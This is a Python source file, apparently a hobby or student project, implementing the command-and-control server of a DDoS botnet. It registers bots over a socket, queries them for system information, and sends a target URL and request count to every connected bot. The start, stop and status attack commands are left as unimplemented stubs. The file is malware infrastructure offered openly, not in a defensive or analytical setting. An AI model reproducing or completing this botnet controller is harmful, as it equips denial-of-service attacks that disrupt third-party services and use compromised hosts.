import http.client
import requests
import socket
import json
import threading

from termcolor import colored, cprint


class CnC:
    """
    Command & Control center of the botnet.
    """

    def __init__(self, host: str, port: int):
        self.__address = (host, port)
        self.__bots = {}
        self.__cmds = {
            'help': {'fun': self.__commands, 'desc': self.__commands.__doc__, 'args': 0},
            'bots': {'fun': self.__list_clients, 'desc': self.__commands.__doc__, 'args': 0},
            'info': {'fun': self.__get_info, 'desc': self.__get_info.__doc__, 'args': 1},
            'status': {'fun': self.__status, 'desc': self.__status.__doc__, 'args': 1},
            'start': {'fun': self.__start, 'desc': self.__start.__doc__, 'args': 1},
            'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
            'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
        }

        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.bind(self.__address)
        self.__socket.listen(10)
        self.__socket.settimeout(2)

    def __bot_connection(self, stop: threading.Event):

        while not stop.is_set():
            try:
                client, address = self.__socket.accept()
            except socket.timeout:
                continue

            address = address[0]

            if address in self.__bots.keys():
                try:
                    self.__bots.pop(address)
                    # print(f"bot {address} removed")
                except ValueError:
                    print(f"{address} not in bot list")
            else:
                self.__bots[address] = int(client.recv(1024).decode("utf-8"))
                # print(f"bot {address} added")
            client.close()

    def __commands(self) -> str:
        """
        Lists all the commands.
        """
        return "\n\t- " + "\n\t- ".join(
            f"{cmd}: {self.__cmds[cmd]['desc']}" for cmd in self.__cmds.keys())

    def __list_clients(self) -> str:
        """
        Lists the bots that are connected to the botnet.
        """
        if self.__bots:
            return "Bots connected:\n" + "\n".join([f"\t- IP:\t{a}\n\t  Port:\t{p}" for a, p in self.__bots.items()])
        return colored("No bot connected.", 'red')

    def __get_info(self, address) -> str:
        """
        Get information about the software and hardware configuration of a bot given his IP address.
        """
        if not self.__bots:
            return colored("No bot connected.", 'red')

        address = address[0]

        if address not in self.__bots.keys():
            return colored("This address does not belong to any connected bot.", 'red')

        try:
            response = requests.get(f"http://{address}:{self.__bots[address]}/info")
        except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
            return colored(e, 'red')

        res = f"System info of bot {address}:\n"
        for k, v in json.loads(response.text).items():
            res += f"\t-{k}: {v}\n"
        return res

    def __status(self, address):
        """
        Check the status of a bot given his IP address.
        """
        pass  # TODO implement status

    def __start(self, url):
        """
        Start a DDoS attack to the specified url.
        """
        pass  # TODO implement start

    def __stop(self):
        """
        Stop the running DDoS attack.
        """
        pass  # TODO implement stop

    def __exit(self) -> str:
        """
        Close the botnet.
        """
        return colored("Closing program...", "red")

    def send_requests(self, url, n):
        if len(self.__bots) == 0:
            return colored("No bot connected.", 'red')

        for address, port in self.__bots.items():
            response = requests.post(f"http://{address}:{port}", json={'url': url, 'n': n})

    def cli(self):

        stop = threading.Event()
        bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
        bot_conn.start()
        cprint("Botnet started...", "green")

        cmd = 0

        while cmd != "exit":
            cprint("\n('help' to view the list of commands).", 'yellow')
            cmd = str.lower(input("\n> "))
            result = self.__run_cmd(cmd)
            print(result)

        stop.set()
        bot_conn.join()

    def __run_cmd(self, line):
        try:
            if ' ' in line:
                cmd, args = line.split(' ', 1)
                args = args.split(' ')
                if self.__cmds[cmd]['args'] > len(args):
                    return colored("Too few arguments.", 'red')
                elif self.__cmds[cmd]['args'] < len(args):
                    return colored("Too many arguments.", 'red')
                else:
                    return self.__cmds[cmd]['fun'](args)
            else:
                cmd = line
                if self.__cmds[cmd]['args'] > 0:
                    return colored("Too few arguments.", 'red')
                else:
                    return self.__cmds[cmd]['fun']()
        except KeyError:
            return colored("Command not recognized.", 'red')


HOST = '127.0.0.1'
PORT = 60000

if __name__ == '__main__':
    cnc = CnC(HOST, PORT)
    cnc.cli()
